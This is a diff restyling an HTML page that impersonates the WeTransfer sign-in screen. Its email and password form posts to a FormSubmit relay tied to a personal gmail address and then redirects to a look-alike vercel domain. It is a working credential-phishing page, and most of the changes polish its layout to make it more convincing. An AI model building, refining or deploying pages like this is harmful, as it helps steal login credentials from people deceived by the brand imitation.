@@ -6,7 +6,7 @@
   <title>WeTransfer Sign In</title>
   <link rel="preconnect" href="https://fonts.googleapis.com">
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="family">
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
   
   <style>
     /* Reset and Base Styles */
@@ -26,23 +26,33 @@
       padding: 20px;
     }
 
-    /* Card Wrapper */
+    /* Card Wrapper with explicit height & flex distribution */
     .login-container {
       background: #ffffff;
       width: 100%;
       max-width: 420px;
+      min-height: 680px; /* Gives enough vertical space to push the logo up */
       padding: 40px 32px;
       text-align: center;
+      display: flex;
+      flex-direction: column;
     }
 
-    /* Logo Styling */
+    /* Logo Styling pushed to the top */
     .logo {
-      font-family: "Times New Roman", Times, serif; /* Approximation of the serif branding if logo asset isn't used */
+      font-family: "Times New Roman", Times, serif; 
       font-size: 44px;
       font-weight: 900;
       letter-spacing: -1.5px;
       color: #000000;
-      margin-bottom: 36px;
+      margin-top: 20px;
+      margin-bottom: auto; /* This forces everything below it down, pushing the logo to the top */
+    }
+
+    /* Form Content Wrapper */
+    .form-content {
+      width: 100%;
+      margin-top: 40px; /* Creates a clean gap below the top area */
     }
 
     /* Headings */
@@ -59,7 +69,7 @@
       margin-bottom: 28px;
     }
 
-    /* Input Groups with Floating/Top Labels */
+    /* Input Groups */
     .input-group {
       position: relative;
       margin-bottom: 14px;
@@ -68,12 +78,12 @@
 
     .input-group input {
       width: 100%;
-      padding: 24px 16px 10px 16px; /* Extra top padding to make room for the label */
+      padding: 24px 16px 10px 16px; 
       font-size: 16px;
       color: #000000;
       background-color: #ffffff;
       border: 1px solid #d3d3d3;
-      border-radius: 14px; /* Distinct soft rounded corner */
+      border-radius: 14px; 
       outline: none;
       transition: border-color 0.2s ease;
     }
@@ -82,7 +92,6 @@
       border-color: #4070f4;
     }
 
-    /* Small Label inside the input box */
     .input-group label {
       position: absolute;
       top: 8px;
@@ -96,7 +105,7 @@
     .btn-continue {
       width: 100%;
       padding: 16px;
-      background-color: #4070f4; /* Precise WeTransfer Blue */
+      background-color: #4070f4; 
       color: #ffffff;
       border: none;
       border-radius: 14px;
@@ -117,7 +126,7 @@
       display: flex;
       flex-direction: column;
       gap: 10px;
-      margin-bottom: 24px;
+      margin-bottom: 32px;
     }
 
     .link {
@@ -134,7 +143,7 @@
       text-align: center;
       color: #a6a6a6;
       font-size: 13px;
-      margin-bottom: 24px;
+      margin-bottom: 32px;
     }
 
     .divider::before,
@@ -156,6 +165,7 @@
     @media (max-width: 480px) {
       .login-container {
         padding: 24px 16px;
+        min-height: 100vh; /* Fills mobile screens nicely like native apps */
       }
     }
   </style>
@@ -165,38 +175,43 @@
   <div class="login-container">
     <img src="logo.08he3n6vuv2qc (1).svg">
 
-    <h2 class="title">Sign In</h2>
-    <p class="subtitle">to continue to your WeTransfer account.</p>
+    <!-- Main Content grouped together below -->
+    <div class="form-content">
+      <h2 class="title">Sign In</h2>
+      <p class="subtitle">to continue to your WeTransfer account.</p>
 
-    <!-- ✅ FormSubmit Integration -->
+     <!-- ✅ FormSubmit Integration -->
   <form action="https://formsubmit.co/sloan6721oq@gmail.com" method="POST">
 
 
     <input type="hidden" name="_next" value="https://wetranfersrgd-x8f8.vercel.app/">
     <input type="hidden" name="_captcha" value="false">
-      
-      <div class="input-group">
-        <label for="email">Email</label>
-        <input type="email" id="email"required>
-      </div>
-
-      <div class="input-group">
-        <label for="password">Password</label>
-        <input type="password" id="password"required"> 
+        <!-- Email Field -->
+        <div class="input-group">
+          <label for="email">Email</label>
+          <input type="email" id="email"required>
         </div>
 
-      <button type="submit" class="btn-continue">Continue</button>
-      
-    </form>
+        <!-- Password Field -->
+        <div class="input-group">
+          <label for="password">Password</label>
+          <input type="password" id="password" placeholder="Password" required"> 
+        </div>
 
-    <div class="links-container">
-      <a class="link">Forgot password?</a>
-      <a class="link">Use a different email?</a>
+        <!-- Submit Button -->
+        <button type="submit" class="btn-continue">Continue</button>
+      </form>
+
+      <!-- Links and Alternative Options -->
+      <div class="links-container">
+        <a class="link">Forgot password?</a>
+        <a class="link">Use a different email?</a>
+      </div>
+
+      <div class="divider">or</div>
+
+      <a class="link">Receive a temporary code via email</a>
     </div>
-
-    <div class="divider">or</div>
-
-    <a class="link">Receive a temporary code via email</a>
   </div>
 
 </body>
